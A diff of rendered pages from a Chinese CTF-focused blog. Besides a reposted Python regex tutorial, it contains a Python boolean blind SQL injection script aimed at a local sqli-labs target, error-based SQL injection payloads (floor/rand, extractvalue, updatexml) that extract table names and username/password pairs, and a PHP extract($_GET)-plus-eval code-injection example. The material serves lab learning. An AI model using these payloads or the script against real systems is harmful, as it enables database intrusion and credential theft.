-<code>'^(0[1-9]|1[0-2]|[0-9])-(0[1-9]|1[0-9]|2[0-9]|3[0-1]|[0-9])$'</code>
-对于<code>2-30</code>,<code>4-31</code>这样的非法日期，用正则还是识别不了，或者说写出来非常困难，这时就需要程序配合识别了。</p>
-<h2 id="贪婪匹配"><strong>贪婪匹配</strong></h2>
-<p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>:
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)(0*)$&#x27;</span>,<span class="string">&#x27;102300&#x27;</span>).groups()</span><br><span class="line">(<span class="string">&#x27;102300&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-由于<code>\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全匹配了，结果<code>0*</code>只能匹配空字符串了。<br />
-必须让<code>\d+</code>采取非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+?)(0*)$&#x27;</span>,<span class="string">&#x27;102300&#x27;</span>).groups()</span><br><span class="line">(<span class="string">&#x27;1023&#x27;</span>,<span class="string">&#x27;00&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="编译"><strong>编译</strong></h2>
-<p>当我们在python中使用正则表达式时，re模块内部会干两件事情： 1.
-编译正则表达式，如果正则表达式的字符串本身不合法，会报错； 2.
-用编译后的正则表达式去匹配字符串。
-如果一个正则表达式要重复使用几千次，出于效率的考虑，我们可以预编译正则表达式，接下来重复使用时就不需要编译这个步骤了，直接匹配：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"># 编译：</span><br><span class="line">&gt;&gt;&gt; re_telephone = re.compile(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;)</span><br><span class="line"># 使用：</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-12345&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;,&#x27;12345&#x27;)</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-8086&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;,&#x27;8086&#x27;)</span><br></pre></td></tr></table></figure> 编译后生成Regular
-Expression对象，由于该对象自己包含了正则表达式，所以调用对应的方法时不用给出正则字符串。</p>
-<p>转载于<a
-target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664">廖雪峰的官方网站</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/14/%E5%9F%BA%E4%BA%8Epython%E8%84%9A%E6%9C%AC%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/14/%E5%9F%BA%E4%BA%8Epython%E8%84%9A%E6%9C%AC%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">基于python脚本的布尔盲注实现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-14 20:53:42" itemprop="dateCreated datePublished" datetime="2022-11-14T20:53:42+08:00">2022-11-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:35:42" itemprop="dateModified" datetime="2023-04-23T17:35:42+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p>
-<p>我们输入正确的id，显示You are in .....<br />
+\d&#123;3&#125;表示匹配3个数字，例如'010'; 2.
+\s可以匹配一个空格（也包括Tab等空白符），所以\s+表示至少有一个空格，例如匹配' '，'    '等；
+3. \d&#123;3,8&#125;表示3-8个数字。例如'1234567'。
+综合起来，上面的正则表达式可以匹 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/14/%E5%9F%BA%E4%BA%8Epython%E8%84%9A%E6%9C%AC%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E7%8E%B0/" title="基于python脚本的布尔盲注实现">基于python脚本的布尔盲注实现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-14T12:53:42.000Z" title="发表于 2022-11-14 20:53:42">2022-11-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。
+我们输入正确的id，显示You are in .....
 我们输入错误的语句如id=1'
-，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p>
-<h1 id="思路">思路</h1>
-<p>先手动找到注入点，然后构造字母表，遍历字母表中的每一个元素，。根据回显的正确与否验证是否为查找内容中的某位数据。</p>
-<h1 id="代码">代码</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;,&#125;&#123;_-=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select就写什么子查询语句</span></span><br><span class="line">select =  <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造SQL语句，发起请求</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; %23&quot;</span></span><br><span class="line">        r= requests.get(url=url+payload)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="comment"># 根据回显判断，如果得到了表示查询成功的回显，那么说明判断数据的这一位是正确的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in......&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功:&quot;</span>,result)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># 这一位已经跑出来了，可以break掉然后下一轮寻黄跑下一位数据了</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果已经跑到字母表最后一位都还没有进到上面的if然后break，说明这轮循环没跑出来正确结果</span></span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[-<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入完成&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/13/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/13/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入之报错注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-13 21:57:33" itemprop="dateCreated datePublished" datetime="2022-11-13T21:57:33+08:00">2022-11-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:33:53" itemprop="dateModified" datetime="2023-04-23T17:33:53+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
-<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
-<p>推荐三种报错注入的方法，直接套用就行。</p>
-<h2 id="group-by-重复键冲">1. group by 重复键冲</h2>
-<h3 id="原理">原理</h3>
-<p>利用select count(<em>),floor(rand(0)</em>2)x from
-information_schema.character_sets group by
-x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)<em>2)函数，实现将注入结果与报错信息回显的注入方式。
-</em> rand()函数<br />
-rand()可以产生一个在0和1之间的随机数<br />
-直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。
-* floor (rand(0)<em>2)函数<br />
-floor函数的作用就是返回小于等于括号内该值的最大整数。<br />
-rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br />
-配合上floor函数就可以产生确定的两个数，即0和1。<br />
-并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。 * group by
-函数<br />
-group by 函数，作用就是分类汇总<br />
-在id 和 name后分别放入a x，意思就是id显示为a name显示为x<br />
-然后使用group by 函数进行分组，并且按照x（name）进行排序。 *
-count(<em>)函数<br />
-count（</em>）函数作用为统计结果的记录数 * 综合使用产生报错<br />
-<code>select count(*),floor(rand(0)*2) x from czs group by x;</code><br />
-当count（<em>）和group by x同时执行时，就会爆出duplicate entry错误。
-</em> 报错原因解析<br />
-通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by
-语句报错的原因是 floor(random(0)<em>2)的不确定性，即可能为 0 也可能为
-1<br />
-group by key
-执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，
-如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand
-值）；如果 该 key 不存在于临时表中，则在临时表中插入 key
-所在行的数据。（插入数据时，会再计算 rand 值）<br />
-如果此时临时表只有 key 为 1 的行不存在 key 为 0
-的行，那么数据库要将该条记录插入临
-时表，由于是随机数，插时又要计算一下随机值，此时
-floor(random(0)</em>2)结果可能为 1，就
-会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值<br />
-实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3
-行一定会报错，2 行 时是不报错的。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>提交如下，获取数据库名字 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure></p>
-<h2 id="extractvalue-函数">2. extractvalue() 函数</h2>
-<blockquote>
-<ul>
-<li>此函数从目标XML中返回包含所查询值的字符串
-语法：extractvalue（XML_document，xpath_string）
-第一个参数：string格式，为XML文档对象的名称
-第二个参数：xpath_string（xpath格式的字符串） select * from test where
-id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath
-syntax）</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>select user,password from users where user_id=1 and
-(extractvalue(1,0x7e));</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
-</ul>
-</blockquote>
-<p><code>?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+</code><br />
-获取数据库名字</p>
-<h2 id="updatexml-函数">3. updatexml() 函数</h2>
-<blockquote>
-<ul>
-<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>作用：改变文档中符合条件的节点的值</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>语法： updatexml（XML_document，XPath_string，new_value）
-第一个参数：是string格式，为XML文档对象的名称，文中为Doc
-第二个参数：代表路径，Xpath格式的字符串例如//title【<span
-class="citation" data-cites="lang">@lang</span>】
-第三个参数：string格式，替换查找到的符合条件的数据</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath
-syntax）</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>例如： select * from test where id = 1 and (updatexml(1,0x7e,3));
-由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
-</ul>
-</blockquote>
-<blockquote>
-<p><strong>另外，updatexml最多只能显示32位，需要配合SUBSTR使用。</strong></p>
-</blockquote>
-<blockquote>
-<p><code>substr(string $string, int $offset, int $length = null): string</code></p>
-</blockquote>
-<blockquote>
-<p>如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从
-0 开始计算</p>
-</blockquote>
-<blockquote>
-<p>如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset
-个字符开始。</p>
-</blockquote>
-<blockquote>
-<p>如果 string 的长度小于 offset，将返回空字符串。</p>
-</blockquote>
-<blockquote>
-<p>如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括
-length 个字符（取决于 string 的长度）。<br />
-如果提供了负数的 length，那么 string 末尾处的 length
-个字符将会被省略（若 offset 是负数则从字符串尾部算起）。如果 offset
-不在这段文本中，那么将返回空字符串。<br />
-如果提供了值为 0 的 length，那么将返回一个空字符串。<br />
-如果没有提供 length，返回的子字符串将从 offset
-位置开始直到字符串结尾。</p>
-</blockquote>
-<p><code>and updatexml(1,concat('^',(需要查询的内容),'^'),1)</code> ###
-1. 提交如下，获取数据库名字<br />
-<code>?id=1' and updatexml(1,concat('^',(database()),'^'),1) --+</code></p>
-<h3 id="获取当前数据库中表的名字">2. 获取当前数据库中表的名字</h3>
-<p><del><code>?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+</code><br />
-这里是说要显示的内容超过一行它不能显示那么多，所以在
-table_schema='security' 后加上 limit
-0,1，显示第一行（显示第0行的往下一行，不包括第0行）
-如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</del><br />
-使用<code>?id=1'and updatexml(1,substr(concat('^',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),'^'),1,32),3) --+</code>可有效解决长度显示问题
-### 3. 爆表中的字段
-<code>?id=1' and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+</code><br />
-总共爆出的字段为： id , username , password</p>
-<h3 id="爆字段中的内容">4. 爆字段中的内容</h3>
-<p><code>?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+</code><br />
-三组用户名和密码。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" class="post-title-link" itemprop="url">PHP变量覆盖</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-12 20:35:50" itemprop="dateCreated datePublished" datetime="2022-11-12T20:35:50+08:00">2022-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:05" itemprop="dateModified" datetime="2023-04-23T17:34:05+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="漏洞原理">漏洞原理</h1>
-<p>变量覆盖是指可以用自己的传参代替原有的变量值</p>
-<h1 id="漏洞寻找">漏洞寻找</h1>
-<p>例如下面的函数或语法使用不当时就会出现漏洞 * $$ * extract() *
-parse_str() * import_request_variables() * mb_parse_str *
-register_globals</p>
-<h1 id="漏洞解析">漏洞解析</h1>
-<h2 id="extract"><strong>extract()</strong></h2>
-<p>原理 &gt; extract()函数从数组中将变量导入到当前的符号表。
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;nsilab&#x27;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = (<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;C&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;T&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;F&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extarct</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="variable">$a</span> = C; <span class="variable">$b</span> = T; <span class="variable">$c</span> = F</span><br></pre></td></tr></table></figure></p>
-<p>攻击手段<br />
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;nsilab&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nsilab&#x27;</span>;</span><br><span class="line">nsilab</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;nsilab&#x27;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img
-src="https://s3.bmp.ovh/imgs/2022/11/12/2c18d66e7a3a912f.png" /></p>
-<h2
-id="原理-产生的漏洞主要是因为foreach遍历数组的值然后将获取的数组键名作为变量数组中的值作为变量的值">**<span
-class="math display">\[**  
+，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态
+思路
+先手动找到注入点，然后构造字母表，遍历字母表中的每一个元素，。根据回显的正确与否验证是否为查找内容中的某位数据。
+代码
+1234567891011121314151617181920212223242526272829303132333435# 导入所需模块import requestsimport string# 构造字母表，根据字母表去爆破每一位的具体值alphabet = string.ascii_letters + string.digits + &quot;,&#125;&#123;_-=&quot;# 题目的URLurl = &quot;http://localhost/sqli/Less-8/?id=&quot; ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/13/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="SQL注入之报错注入">SQL注入之报错注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-13T13:57:33.000Z" title="发表于 2022-11-13 21:57:33">2022-11-13</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。
+报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。
+推荐三种报错注入的方法，直接套用就行。
+1. group by 重复键冲
 原理
-&gt;
-\\]</span>产生的漏洞主要是因为foreach遍历数组的值，然后将获取的数组键名作为变量，数组中的值作为变量的值</h2>
-<ul>
-<li>foreach循环只适用于数组，并用于遍历数组中的每个键/值对。
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$colors</span> = <span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$colors</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$value</span> \n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">red</span><br><span class="line">green</span><br><span class="line">blue</span><br><span class="line">yellow</span><br></pre></td></tr></table></figure></li>
-<li>$$ &gt; 在php中，<span
-class="math inline">\(var表示一个名为var的普通变量，它存储字符串、整数、浮点等任何值。而\)</span><span
-class="math inline">\(var是一个引用变量，用于存储\)</span>var的值
